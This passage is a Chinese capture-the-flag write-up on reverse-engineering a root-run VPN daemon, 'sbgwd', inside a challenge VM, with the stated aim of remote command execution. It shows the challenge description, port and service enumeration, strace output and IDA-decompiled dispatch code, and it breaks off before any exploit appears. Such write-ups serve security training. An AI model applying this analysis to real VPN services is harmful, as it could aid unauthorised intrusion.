<div class="detail_content markdown-body editormd-preview-container" id="markdown-body">
<div id="app">
<h2 data-content="1" id="dbbcecccef83fb00c5f88ebf52081963">赛题环境配置</h2>
<p>拿到赛题:</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20241210135257-01c52556-b6bb-1.png"/></p>
<p>描述:<br/>
题目信息：<br/>
题目名称：ire<br/>
旗帜名称：IRE<br/>
题目描述：附件中给出了一台Ubunt64-bit 22.04.5 LTS虚拟机，环境和展示区相同但密码不同。虚拟机/home/game目录中有start.sh脚本，选手可以执行start.sh脚本启动题目环境（提供的虚拟机中已经通过服务启动）。请挖掘并利用相关程序的漏洞，实现任意命令执行，若靶机弹出计算器则挑战成功。<br/>
附件信息：虚拟机用户名和口令为game/game<br/>
台上拓扑：交换机同时连接选手攻击机和靶机。靶机中使用vmware（最新版）启动附件中的Ubunt64-bit 22.04.5 LTS环境，并以game用户登录。<br/>
展示目标：选手携带自己的攻击机上台，接入靶机所在网段开始进行脆弱性检测，若在规定时间内靶机弹出计算器，即为挑战成功。</p>
<p>展示时操作人员操作步骤：<br/>
1）  回复虚拟机快照到初始状态；<br/>
2）  测试网络是否能够连通，如网络通联状况正常则可示意选手开始，同时开始计时；<br/>
3）  成功或超时后，关闭虚拟机、回复虚拟机快照到初始状态。</p>
<p>配置好vmtool,后就可以开始正式的分析了!<br/>
成果启动后,开始寻找漏洞!</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20241210135320-0fa194fc-b6bb-1.png"/></p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20241210135324-117a1588-b6bb-1.png"/></p>
<h2 data-content="1" id="7c7b8234aaa37184f3eed457e9b73ded">开始分析目标文件</h2>
<p>开始分析:</p>
<div class="highlight"><pre><span></span><span class="ch">#!/bin/bash</span>
<span class="nv">LD_PRELOAD</span><span class="o">=</span>/home/game/libstrongswan.so.0 /home/game/sbgwd
</pre></div>
<h3 data-content="1" id="a56b1fca163753de12c0b9fbb9b970fa">查看服务器所开启的端口</h3>
<div class="highlight"><pre><span></span><span class="n">game</span><span class="nd">@box</span><span class="p">:~/</span><span class="n">Desktop</span><span class="p">$</span> <span class="n">sudo</span> <span class="n">su</span>
<span class="p">[</span><span class="n">sudo</span><span class="p">]</span> <span class="n">password</span> <span class="k">for</span> <span class="n">game</span><span class="p">:</span> 
<span class="n">root</span><span class="nd">@box</span><span class="p">:/</span><span class="n">home</span><span class="p">/</span><span class="n">game</span><span class="p">/</span><span class="n">Desktop</span><span class="err">#</span> <span class="n">ss</span> <span class="p">-</span><span class="n">tuln</span>
<span class="n">Netid</span> <span class="n">State</span>  <span class="n">Recv</span><span class="p">-</span><span class="n">Q</span> <span class="n">Send</span><span class="p">-</span><span class="n">Q</span>         <span class="n">Local</span> <span class="n">Address</span><span class="p">:</span><span class="n">Port</span>  <span class="n">Peer</span> <span class="n">Address</span><span class="p">:</span><span class="n">PortProcess</span>
<span class="n">udp</span>   <span class="n">UNCONN</span> <span class="mi">0</span>      <span class="mi">0</span>                    <span class="mf">0.0.0.0</span><span class="p">:</span><span class="mi">5353</span>       <span class="mf">0.0.0.0</span><span class="p">:*</span>          
<span class="n">udp</span>   <span class="n">UNCONN</span> <span class="mi">0</span>      <span class="mi">0</span>              <span class="mf">127.0.0.53</span><span class="p">%</span><span class="n">lo</span><span class="p">:</span><span class="mi">53</span>         <span class="mf">0.0.0.0</span><span class="p">:*</span>          
<span class="n">udp</span>   <span class="n">UNCONN</span> <span class="mi">0</span>      <span class="mi">0</span>      <span class="mf">192.168.126.145</span><span class="p">%</span><span class="n">ens33</span><span class="p">:</span><span class="mi">68</span>         <span class="mf">0.0.0.0</span><span class="p">:*</span>          
<span class="n">udp</span>   <span class="n">UNCONN</span> <span class="mi">0</span>      <span class="mi">0</span>                    <span class="mf">0.0.0.0</span><span class="p">:</span><span class="mi">45263</span>      <span class="mf">0.0.0.0</span><span class="p">:*</span>          
<span class="n">udp</span>   <span class="n">UNCONN</span> <span class="mi">0</span>      <span class="mi">0</span>                       <span class="p">[::]:</span><span class="mi">5353</span>          <span class="p">[::]:*</span>          
<span class="n">udp</span>   <span class="n">UNCONN</span> <span class="mi">0</span>      <span class="mi">0</span>                       <span class="p">[::]:</span><span class="mi">60013</span>         <span class="p">[::]:*</span>          
<span class="n">tcp</span>   <span class="n">LISTEN</span> <span class="mi">0</span>      <span class="mi">4096</span>           <span class="mf">127.0.0.53</span><span class="p">%</span><span class="n">lo</span><span class="p">:</span><span class="mi">53</span>         <span class="mf">0.0.0.0</span><span class="p">:*</span>          
<span class="n">tcp</span>   <span class="n">LISTEN</span> <span class="mi">0</span>      <span class="mi">128</span>                <span class="mf">127.0.0.1</span><span class="p">:</span><span class="mi">631</span>        <span class="mf">0.0.0.0</span><span class="p">:*</span>          
<span class="n">tcp</span>   <span class="n">LISTEN</span> <span class="mi">0</span>      <span class="mi">4096</span>                 <span class="mf">0.0.0.0</span><span class="p">:</span><span class="mi">45443</span>      <span class="mf">0.0.0.0</span><span class="p">:*</span>          
<span class="n">tcp</span>   <span class="n">LISTEN</span> <span class="mi">0</span>      <span class="mi">511</span>                <span class="mf">127.0.0.1</span><span class="p">:</span><span class="mi">80</span>         <span class="mf">0.0.0.0</span><span class="p">:*</span>          
<span class="n">tcp</span>   <span class="n">LISTEN</span> <span class="mi">0</span>      <span class="mi">128</span>                    <span class="p">[::</span><span class="mi">1</span><span class="p">]:</span><span class="mi">631</span>           <span class="p">[::]:*</span>          
<span class="n">root</span><span class="nd">@box</span><span class="p">:/</span><span class="n">home</span><span class="p">/</span><span class="n">game</span><span class="p">/</span><span class="n">Desktop</span><span class="err">#</span> <span class="n">ps</span> <span class="n">aux</span> <span class="p">|</span> <span class="n">grep</span> <span class="n">sbgwd</span>
<span class="n">root</span>        <span class="mi">1014</span>  <span class="mf">0.0</span>  <span class="mf">0.2</span> <span class="mi">180428</span>  <span class="mi">8032</span> <span class="p">?</span>        <span class="n">Sl</span>   <span class="mi">14</span><span class="p">:</span><span class="mo">01</span>   <span class="mi">0</span><span class="p">:</span><span class="mo">00</span> <span class="p">/</span><span class="n">home</span><span class="p">/</span><span class="n">game</span><span class="p">/</span><span class="n">sbgwd</span>
<span class="n">root</span>        <span class="mi">2327</span>  <span class="mf">0.0</span>  <span class="mf">0.0</span>   <span class="mi">6612</span>  <span class="mi">2260</span> <span class="n">pts</span><span class="p">/</span><span class="mi">1</span>    <span class="n">S</span><span class="p">+</span>   <span class="mi">14</span><span class="p">:</span><span class="mo">05</span>   <span class="mi">0</span><span class="p">:</span><span class="mo">00</span> <span class="n">grep</span> <span class="p">--</span><span class="n">color</span><span class="p">=</span><span class="k">auto</span> <span class="n">sbgwd</span>
</pre></div>
<h3 data-content="1" id="fd61829018b63f5db851efc88c97ad1a">寻找到目标程序的启动方案</h3>
<p>先看下是如何启动的,通过系统服务</p>
<div class="highlight"><pre><span></span><span class="n">root</span><span class="nd">@box</span><span class="p">:/</span><span class="n">etc</span><span class="err">#</span> <span class="n">grep</span> <span class="p">-</span><span class="n">r</span> <span class="s">"start.sh"</span>
<span class="n">systemd</span><span class="p">/</span><span class="n">system</span><span class="p">/</span><span class="n">myservice</span><span class="p">.</span><span class="n">service</span><span class="p">:</span><span class="n">ExecStart</span><span class="p">=/</span><span class="n">home</span><span class="p">/</span><span class="n">game</span><span class="p">/</span><span class="n">start</span><span class="p">.</span><span class="n">sh</span>
<span class="n">root</span><span class="nd">@box</span><span class="p">:/</span><span class="n">etc</span><span class="err">#</span> <span class="n">cat</span> <span class="n">systemd</span><span class="p">/</span><span class="n">system</span><span class="p">/</span><span class="n">myservice</span><span class="p">.</span><span class="n">service</span>
<span class="p">[</span><span class="n">Unit</span><span class="p">]</span>
<span class="n">Description</span><span class="p">=</span><span class="n">My</span> <span class="n">Custom</span> <span class="n">Script</span> <span class="n">Service</span>
<span class="n">After</span><span class="p">=</span><span class="n">network</span><span class="p">.</span><span class="n">target</span>

<span class="p">[</span><span class="n">Service</span><span class="p">]</span>
<span class="n">ExecStart</span><span class="p">=/</span><span class="n">home</span><span class="p">/</span><span class="n">game</span><span class="p">/</span><span class="n">start</span><span class="p">.</span><span class="n">sh</span>
<span class="n">Restart</span><span class="p">=</span><span class="n">on</span><span class="p">-</span><span class="n">failure</span>
<span class="n">User</span><span class="p">=</span><span class="n">root</span>
<span class="n">Group</span><span class="p">=</span><span class="n">root</span>

<span class="p">[</span><span class="n">Install</span><span class="p">]</span>
<span class="n">WantedBy</span><span class="p">=</span><span class="n">multi</span><span class="p">-</span><span class="n">user</span><span class="p">.</span><span class="n">target</span>
</pre></div>
<div class="highlight"><pre><span></span><span class="n">root</span><span class="nd">@box</span><span class="p">:/</span><span class="n">home</span><span class="p">/</span><span class="n">game</span><span class="err">#</span> <span class="n">systemctl</span> <span class="n">status</span> <span class="n">myservice</span><span class="p">.</span><span class="n">service</span>
<span class="err">●</span> <span class="n">myservice</span><span class="p">.</span><span class="n">service</span> <span class="p">-</span> <span class="n">My</span> <span class="n">Custom</span> <span class="n">Script</span> <span class="n">Service</span>
     <span class="n">Loaded</span><span class="p">:</span> <span class="n">loaded</span> <span class="p">(/</span><span class="n">etc</span><span class="p">/</span><span class="n">systemd</span><span class="p">/</span><span class="n">system</span><span class="p">/</span><span class="n">myservice</span><span class="p">.</span><span class="n">service</span><span class="p">;</span> <span class="n">enabled</span><span class="p">;</span> <span class="n">vendor</span> <span class="n">preset</span><span class="p">:</span> <span class="n">enabled</span><span class="p">)</span>
     <span class="n">Active</span><span class="p">:</span> <span class="n">active</span> <span class="p">(</span><span class="n">running</span><span class="p">)</span> <span class="n">since</span> <span class="n">Mon</span> <span class="mi">2024</span><span class="p">-</span><span class="mi">12</span><span class="p">-</span><span class="mi">09</span> <span class="mi">17</span><span class="p">:</span><span class="mo">01</span><span class="p">:</span><span class="mi">40</span> <span class="n">UTC</span><span class="p">;</span> <span class="mi">1</span><span class="n">min</span> <span class="mi">53</span><span class="n">s</span> <span class="n">ago</span>
   <span class="n">Main</span> <span class="n">PID</span><span class="p">:</span> <span class="mi">3991</span> <span class="p">(</span><span class="n">start</span><span class="p">.</span><span class="n">sh</span><span class="p">)</span>
      <span class="n">Tasks</span><span class="p">:</span> <span class="mi">6</span> <span class="p">(</span><span class="n">limit</span><span class="p">:</span> <span class="mi">4514</span><span class="p">)</span>
     <span class="n">Memory</span><span class="p">:</span> <span class="mf">1.7</span><span class="n">M</span>
        <span class="n">CPU</span><span class="p">:</span> <span class="mi">7</span><span class="n">ms</span>
     <span class="n">CGroup</span><span class="p">:</span> <span class="p">/</span><span class="n">system</span><span class="p">.</span><span class="n">slice</span><span class="p">/</span><span class="n">myservice</span><span class="p">.</span><span class="n">service</span>
             <span class="err">├─</span><span class="mi">3991</span> <span class="p">/</span><span class="n">bin</span><span class="p">/</span><span class="n">bash</span> <span class="p">/</span><span class="n">home</span><span class="p">/</span><span class="n">game</span><span class="p">/</span><span class="n">start</span><span class="p">.</span><span class="n">sh</span>
             <span class="err">└─</span><span class="mi">3992</span> <span class="p">/</span><span class="n">home</span><span class="p">/</span><span class="n">game</span><span class="p">/</span><span class="n">sbgwd</span>

<span class="n">Dec</span> <span class="mi">09</span> <span class="mi">17</span><span class="p">:</span><span class="mo">01</span><span class="p">:</span><span class="mi">40</span> <span class="n">box</span> <span class="n">sbgwd</span><span class="p">[</span><span class="mi">3992</span><span class="p">]:</span> <span class="n">IPv6</span> <span class="n">enabled</span> <span class="n">ens33</span>
<span class="n">Dec</span> <span class="mi">09</span> <span class="mi">17</span><span class="p">:</span><span class="mo">01</span><span class="p">:</span><span class="mi">40</span> <span class="n">box</span> <span class="n">sbgwd</span><span class="p">[</span><span class="mi">3992</span><span class="p">]:</span> <span class="k">try</span> <span class="n">bind</span> <span class="k">interface</span> <span class="n">ANY</span>
<span class="n">Dec</span> <span class="mi">09</span> <span class="mi">17</span><span class="p">:</span><span class="mo">01</span><span class="p">:</span><span class="mi">40</span> <span class="n">box</span> <span class="n">sbgwd</span><span class="p">[</span><span class="mi">3992</span><span class="p">]:</span> <span class="n">socket</span> <span class="n">count</span> <span class="mi">1</span>
<span class="n">Dec</span> <span class="mi">09</span> <span class="mi">17</span><span class="p">:</span><span class="mo">01</span><span class="p">:</span><span class="mi">40</span> <span class="n">box</span> <span class="n">sbgwd</span><span class="p">[</span><span class="mi">3992</span><span class="p">]:</span> <span class="mi">0</span> <span class="p">:</span> <span class="n">family</span> <span class="mi">2</span>
<span class="n">Dec</span> <span class="mi">09</span> <span class="mi">17</span><span class="p">:</span><span class="mo">01</span><span class="p">:</span><span class="mi">40</span> <span class="n">box</span> <span class="n">sbgwd</span><span class="p">[</span><span class="mi">3992</span><span class="p">]:</span> <span class="n">create_socket_and_bind</span> <span class="p">:</span> <span class="mi">6</span>
<span class="n">Dec</span> <span class="mi">09</span> <span class="mi">17</span><span class="p">:</span><span class="mo">01</span><span class="p">:</span><span class="mi">40</span> <span class="n">box</span> <span class="n">sbgwd</span><span class="p">[</span><span class="mi">3992</span><span class="p">]:</span> <span class="n">listen</span> <span class="n">socket</span> <span class="n">count</span> <span class="mi">1</span>
<span class="n">Dec</span> <span class="mi">09</span> <span class="mi">17</span><span class="p">:</span><span class="mo">01</span><span class="p">:</span><span class="mi">40</span> <span class="n">box</span> <span class="n">sbgwd</span><span class="p">[</span><span class="mi">3992</span><span class="p">]:</span> <span class="n">listen</span> <span class="n">socket</span> <span class="mi">6</span>
<span class="n">Dec</span> <span class="mi">09</span> <span class="mi">17</span><span class="p">:</span><span class="mo">01</span><span class="p">:</span><span class="mi">40</span> <span class="n">box</span> <span class="n">sbgwd</span><span class="p">[</span><span class="mi">3992</span><span class="p">]:</span> <span class="n">current_clients</span><span class="p">=</span><span class="mi">0</span> <span class="n">max_clients</span><span class="p">=</span><span class="mi">0</span>
<span class="n">Dec</span> <span class="mi">09</span> <span class="mi">17</span><span class="p">:</span><span class="mo">01</span><span class="p">:</span><span class="mi">40</span> <span class="n">box</span> <span class="n">sbgwd</span><span class="p">[</span><span class="mi">3992</span><span class="p">]:</span> <span class="mf">2.0.0.113</span> <span class="p">(</span><span class="mi">20231117</span><span class="p">)</span> <span class="n">ready</span>
<span class="n">Dec</span> <span class="mi">09</span> <span class="mi">17</span><span class="p">:</span><span class="mo">01</span><span class="p">:</span><span class="mi">40</span> <span class="n">box</span> <span class="n">sbgwd</span><span class="p">[</span><span class="mi">3992</span><span class="p">]:</span> <span class="n">accept</span> <span class="n">socket</span> <span class="mi">6</span>
</pre></div>
<div class="highlight"><pre><span></span><span class="n">root</span><span class="nd">@box</span><span class="p">:/</span><span class="n">home</span><span class="p">/</span><span class="n">game</span><span class="err">#</span> <span class="n">systemctl</span> <span class="n">stop</span> <span class="n">myservice</span><span class="p">.</span><span class="n">service</span>
<span class="n">root</span><span class="nd">@box</span><span class="p">:/</span><span class="n">home</span><span class="p">/</span><span class="n">game</span><span class="err">#</span> <span class="n">systemctl</span> <span class="n">status</span> <span class="n">myservice</span><span class="p">.</span><span class="n">service</span>
<span class="err">○</span> <span class="n">myservice</span><span class="p">.</span><span class="n">service</span> <span class="p">-</span> <span class="n">My</span> <span class="n">Custom</span> <span class="n">Script</span> <span class="n">Service</span>
     <span class="n">Loaded</span><span class="p">:</span> <span class="n">loaded</span> <span class="p">(/</span><span class="n">etc</span><span class="p">/</span><span class="n">systemd</span><span class="p">/</span><span class="n">system</span><span class="p">/</span><span class="n">myservice</span><span class="p">.</span><span class="n">service</span><span class="p">;</span> <span class="n">enabled</span><span class="p">;</span> <span class="n">vendor</span> <span class="n">preset</span><span class="p">:</span> <span class="n">enabled</span><span class="p">)</span>
     <span class="n">Active</span><span class="p">:</span> <span class="n">inactive</span> <span class="p">(</span><span class="n">dead</span><span class="p">)</span> <span class="n">since</span> <span class="n">Mon</span> <span class="mi">2024</span><span class="p">-</span><span class="mi">12</span><span class="p">-</span><span class="mi">09</span> <span class="mi">17</span><span class="p">:</span><span class="mo">06</span><span class="p">:</span><span class="mi">36</span> <span class="n">UTC</span><span class="p">;</span> <span class="mi">1</span><span class="n">s</span> <span class="n">ago</span>
    <span class="n">Process</span><span class="p">:</span> <span class="mi">3991</span> <span class="n">ExecStart</span><span class="p">=/</span><span class="n">home</span><span class="p">/</span><span class="n">game</span><span class="p">/</span><span class="n">start</span><span class="p">.</span><span class="n">sh</span> <span class="p">(</span><span class="n">code</span><span class="p">=</span><span class="n">killed</span><span class="p">,</span> <span class="n">signal</span><span class="p">=</span><span class="n">TERM</span><span class="p">)</span>
   <span class="n">Main</span> <span class="n">PID</span><span class="p">:</span> <span class="mi">3991</span> <span class="p">(</span><span class="n">code</span><span class="p">=</span><span class="n">killed</span><span class="p">,</span> <span class="n">signal</span><span class="p">=</span><span class="n">TERM</span><span class="p">)</span>
        <span class="n">CPU</span><span class="p">:</span> <span class="mi">9</span><span class="n">ms</span>

<span class="n">Dec</span> <span class="mi">09</span> <span class="mi">17</span><span class="p">:</span><span class="mo">01</span><span class="p">:</span><span class="mi">40</span> <span class="n">box</span> <span class="n">sbgwd</span><span class="p">[</span><span class="mi">3992</span><span class="p">]:</span> <span class="mi">0</span> <span class="p">:</span> <span class="n">family</span> <span class="mi">2</span>
<span class="n">Dec</span> <span class="mi">09</span> <span class="mi">17</span><span class="p">:</span><span class="mo">01</span><span class="p">:</span><span class="mi">40</span> <span class="n">box</span> <span class="n">sbgwd</span><span class="p">[</span><span class="mi">3992</span><span class="p">]:</span> <span class="n">create_socket_and_bind</span> <span class="p">:</span> <span class="mi">6</span>
<span class="n">Dec</span> <span class="mi">09</span> <span class="mi">17</span><span class="p">:</span><span class="mo">01</span><span class="p">:</span><span class="mi">40</span> <span class="n">box</span> <span class="n">sbgwd</span><span class="p">[</span><span class="mi">3992</span><span class="p">]:</span> <span class="n">listen</span> <span class="n">socket</span> <span class="n">count</span> <span class="mi">1</span>
<span class="n">Dec</span> <span class="mi">09</span> <span class="mi">17</span><span class="p">:</span><span class="mo">01</span><span class="p">:</span><span class="mi">40</span> <span class="n">box</span> <span class="n">sbgwd</span><span class="p">[</span><span class="mi">3992</span><span class="p">]:</span> <span class="n">listen</span> <span class="n">socket</span> <span class="mi">6</span>
<span class="n">Dec</span> <span class="mi">09</span> <span class="mi">17</span><span class="p">:</span><span class="mo">01</span><span class="p">:</span><span class="mi">40</span> <span class="n">box</span> <span class="n">sbgwd</span><span class="p">[</span><span class="mi">3992</span><span class="p">]:</span> <span class="n">current_clients</span><span class="p">=</span><span class="mi">0</span> <span class="n">max_clients</span><span class="p">=</span><span class="mi">0</span>
<span class="n">Dec</span> <span class="mi">09</span> <span class="mi">17</span><span class="p">:</span><span class="mo">01</span><span class="p">:</span><span class="mi">40</span> <span class="n">box</span> <span class="n">sbgwd</span><span class="p">[</span><span class="mi">3992</span><span class="p">]:</span> <span class="mf">2.0.0.113</span> <span class="p">(</span><span class="mi">20231117</span><span class="p">)</span> <span class="n">ready</span>
<span class="n">Dec</span> <span class="mi">09</span> <span class="mi">17</span><span class="p">:</span><span class="mo">01</span><span class="p">:</span><span class="mi">40</span> <span class="n">box</span> <span class="n">sbgwd</span><span class="p">[</span><span class="mi">3992</span><span class="p">]:</span> <span class="n">accept</span> <span class="n">socket</span> <span class="mi">6</span>
<span class="n">Dec</span> <span class="mi">09</span> <span class="mi">17</span><span class="p">:</span><span class="mo">06</span><span class="p">:</span><span class="mi">36</span> <span class="n">box</span> <span class="n">systemd</span><span class="p">[</span><span class="mi">1</span><span class="p">]:</span> <span class="n">Stopping</span> <span class="n">My</span> <span class="n">Custom</span> <span class="n">Script</span> <span class="n">Service</span><span class="p">...</span>
<span class="n">Dec</span> <span class="mi">09</span> <span class="mi">17</span><span class="p">:</span><span class="mo">06</span><span class="p">:</span><span class="mi">36</span> <span class="n">box</span> <span class="n">systemd</span><span class="p">[</span><span class="mi">1</span><span class="p">]:</span> <span class="n">myservice</span><span class="p">.</span><span class="n">service</span><span class="p">:</span> <span class="n">Deactivated</span> <span class="n">successfully</span><span class="p">.</span>
<span class="n">Dec</span> <span class="mi">09</span> <span class="mi">17</span><span class="p">:</span><span class="mo">06</span><span class="p">:</span><span class="mi">36</span> <span class="n">box</span> <span class="n">systemd</span><span class="p">[</span><span class="mi">1</span><span class="p">]:</span> <span class="n">Stopped</span> <span class="n">My</span> <span class="n">Custom</span> <span class="n">Script</span> <span class="n">Service</span><span class="p">.</span>
</pre></div>
<h3 data-content="1" id="4859e8bfe7238b7b1e6b6f15b396bfda">检查系统日志了解sbgwd的运行</h3>
<p>手动启动服务:</p>
<div class="highlight"><pre><span></span><span class="n">root</span><span class="nd">@box</span><span class="p">:/</span><span class="n">home</span><span class="p">/</span><span class="n">game</span><span class="err">#</span> <span class="n">LD_PRELOAD</span><span class="p">=/</span><span class="n">home</span><span class="p">/</span><span class="n">game</span><span class="p">/</span><span class="n">libstrongswan</span><span class="p">.</span><span class="n">so</span><span class="mf">.0</span> <span class="n">strace</span> <span class="p">-</span><span class="n">i</span> <span class="p">/</span><span class="n">home</span><span class="p">/</span><span class="n">game</span><span class="p">/</span><span class="n">sbgwd</span>
</pre></div>
<div class="highlight"><pre><span></span><span class="err">#可以找到的输出</span><span class="p">,</span><span class="err">权限不足直接开启</span><span class="n">su</span>
<span class="p">[</span><span class="mo">00007</span><span class="n">f6c630e65b4</span><span class="p">]</span><span class="n">openat</span><span class="p">(</span><span class="n">AT</span> <span class="n">FDCWD</span><span class="p">,</span><span class="s">"/etc/ssl/private/ssgw ssl.key"</span><span class="p">,</span><span class="n">O</span> <span class="n">RDONLY</span><span class="p">)=-</span><span class="mi">1</span>
<span class="n">EACCES</span> <span class="p">(</span><span class="n">Permission</span> <span class="n">denied</span><span class="p">)</span>

<span class="err">#发现端口已经被启动</span>
<span class="p">[</span><span class="mo">00007</span><span class="n">f61e4ef74bb</span><span class="p">]</span> <span class="n">bind</span><span class="p">(</span><span class="mi">6</span><span class="p">,</span> <span class="p">{</span><span class="n">sa_family</span><span class="p">=</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">sin_port</span><span class="p">=</span><span class="n">htons</span><span class="p">(</span><span class="mi">45443</span><span class="p">),</span> <span class="n">sin_addr</span><span class="p">=</span><span class="n">inet_addr</span><span class="p">(</span><span class="s">"0.0.0.0"</span><span class="p">)},</span> <span class="mi">16</span><span class="p">)</span> <span class="p">=</span> <span class="p">-</span><span class="mi">1</span> <span class="n">EADDRINUSE</span> <span class="p">(</span><span class="n">Address</span> <span class="n">already</span> <span class="k">in</span> <span class="n">use</span><span class="p">)</span>
</pre></div>
<p>直接通过查看日志来定位程序运行的位置:</p>
<div class="highlight"><pre><span></span><span class="n">root</span><span class="nd">@box</span><span class="p">:/</span><span class="n">home</span><span class="p">/</span><span class="n">game</span><span class="err">#</span> <span class="n">sudo</span> <span class="n">journalctl</span> <span class="p">-</span><span class="n">f</span>
</pre></div>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20241210135550-688c102e-b6bb-1.png"/></p>
<h2 data-content="1" id="613b8f67c04697020aa046525d73693f">开始逆向分析sbgwd程序</h2>
<p>将二进制文件拿出来后就可以开始IDA逆向分析了!</p>
<div class="highlight"><pre><span></span><span class="kr">__int64</span> <span class="kr">__fastcall</span> <span class="nf">main</span><span class="p">(</span><span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">a1</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">a2</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">a3</span><span class="p">)</span>
<span class="p">{</span>
  <span class="c1">// [COLLAPSED LOCAL DECLARATIONS. PRESS KEYPAD CTRL-"+" TO EXPAND]</span>

  <span class="n">memset</span><span class="p">(</span><span class="o">&amp;</span><span class="n">stru_23340</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mh">0x908uLL</span><span class="p">);</span>
  <span class="n">ptr</span> <span class="o">=</span> <span class="mi">0LL</span><span class="p">;</span>
  <span class="n">ifa</span> <span class="o">=</span> <span class="mi">0LL</span><span class="p">;</span>
  <span class="n">ai</span> <span class="o">=</span> <span class="mi">0LL</span><span class="p">;</span>
<span class="p">...</span>
  <span class="n">library_deinit</span><span class="p">();</span>
  <span class="n">syslog</span><span class="p">(</span><span class="mi">7</span><span class="p">,</span> <span class="s">"exit"</span><span class="p">);</span>
  <span class="n">closelog</span><span class="p">();</span>
  <span class="k">return</span> <span class="n">v5</span><span class="p">;</span>
<span class="p">}</span>
</pre></div>
<h3 data-content="1" id="0263409f0b4f57d4e94373c8f88597c9">逆向分析出该程序为VPN,锁定vpn的密钥和证书</h3>
<p>难点是容易被误导和命令执行<br/>
通过逆向后发现程序是一个 vpn 程序，但是需要先利用题目提供的 key 和 cert 进行交互<br/>
sub_B9E0 函数是主要函数，在这里实现了数据读取和 VPN 菜单功能</p>
<div class="highlight"><pre><span></span><span class="n">inet_ntop</span><span class="p">(</span><span class="mi">8</span> <span class="o">*</span> <span class="p">(</span><span class="n">ptr</span><span class="o">-&gt;</span><span class="n">opt5_flag</span> <span class="o">==</span> <span class="mi">1</span><span class="p">)</span> <span class="o">+</span> <span class="mi">2</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">ptr</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="n">buf</span><span class="p">,</span> <span class="mh">0x2Eu</span><span class="p">);</span>
    <span class="k">switch</span> <span class="p">(</span> <span class="n">__ROL2__</span><span class="p">(</span><span class="o">*</span><span class="p">(</span><span class="n">_WORD</span> <span class="o">*</span><span class="p">)</span><span class="n">ptr</span><span class="o">-&gt;</span><span class="n">opt</span><span class="p">,</span> <span class="mi">8</span><span class="p">)</span> <span class="p">)</span>
    <span class="p">{</span>
      <span class="k">case</span> <span class="mi">0</span><span class="o">:</span>
        <span class="n">syslog</span><span class="p">(</span><span class="mi">7</span><span class="p">,</span> <span class="s">"%lx MAJOR_COMMAND_AUTH"</span><span class="p">,</span> <span class="n">v13</span><span class="p">);</span>
        <span class="k">return</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">int</span><span class="p">)</span><span class="n">VPN_AUTH</span><span class="p">(</span><span class="n">a1</span><span class="p">,</span> <span class="n">a4</span><span class="p">,</span> <span class="n">a5</span><span class="p">,</span> <span class="n">a6</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="n">ptr</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span><span class="c1">// LOGIN</span>
      <span class="k">case</span> <span class="mi">1</span><span class="o">:</span>
        <span class="n">syslog</span><span class="p">(</span><span class="mi">7</span><span class="p">,</span> <span class="s">"%lx MAJOR_COMMAND_LOG"</span><span class="p">,</span> <span class="n">v13</span><span class="p">);</span>
        <span class="k">return</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">int</span><span class="p">)</span><span class="n">sub_B8D0</span><span class="p">((</span><span class="kr">__int64</span><span class="p">)</span><span class="n">ptr</span><span class="p">,</span> <span class="n">a6</span><span class="p">,</span> <span class="n">buf</span><span class="p">);</span><span class="c1">// Lgout</span>
      <span class="k">case</span> <span class="mi">2</span><span class="o">:</span>
        <span class="n">v17</span> <span class="o">=</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
        <span class="n">syslog</span><span class="p">(</span><span class="mi">7</span><span class="p">,</span> <span class="s">"%lx MAJOR_COMMAND_POLICY"</span><span class="p">,</span> <span class="n">v13</span><span class="p">);</span>
        <span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="n">ptr</span><span class="o">-&gt;</span><span class="n">opt7_flag</span> <span class="p">)</span>
          <span class="k">return</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">int</span><span class="p">)</span><span class="n">COMMAND_POLICY</span><span class="p">(</span><span class="n">a1</span><span class="p">);</span>
        <span class="k">return</span> <span class="n">v17</span><span class="p">;</span>
      <span class="k">case</span> <span class="mi">3</span><span class="o">:</span>
        <span class="n">syslog</span><span class="p">(</span><span class="mi">7</span><span class="p">,</span> <span class="s">"%lx MAJOR_COMMAND_SESSION"</span><span class="p">,</span> <span class="n">v13</span><span class="p">);</span>
        <span class="n">v20</span> <span class="o">=</span> <span class="n">__ROL2__</span><span class="p">(</span><span class="n">ptr</span><span class="o">-&gt;</span><span class="n">opt7_flag</span><span class="p">,</span> <span class="mi">8</span><span class="p">);</span>
        <span class="k">if</span> <span class="p">(</span> <span class="n">v20</span> <span class="p">)</span>
        <span class="p">{</span>
          <span class="k">if</span> <span class="p">(</span> <span class="n">v20</span> <span class="o">==</span> <span class="mi">1</span> <span class="p">)</span>
            <span class="n">v17</span> <span class="o">=</span> <span class="n">SESSION_1</span><span class="p">(</span><span class="n">a1</span><span class="p">,</span> <span class="n">ptr</span><span class="p">);</span>
          <span class="k">else</span>
<span class="nl">LABEL_29</span><span class="p">:</span>
            <span class="n">v17</span> <span class="o">=</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
        <span class="p">}</span>
        <span class="k">else</span>
        <span class="p">{</span>
          <span class="n">v17</span> <span class="o">=</span> <span class="n">SESSION_2</span><span class="p">(</span><span class="n">a1</span><span class="p">);</span>
        <span class="p">}</span>
        <span class="k">break</span><span class="p">;</span>
      <span class="k">case</span> <span class="mi">5</span><span class="o">:</span>
        <span class="n">syslog</span><span class="p">(</span><span class="mi">7</span><span class="p">,</span> <span class="s">"%lx MAJOR_COMMAND_SET_REDIRECT_INFO"</span><span class="p">,</span> <span class="n">v13</span><span class="p">);</span>
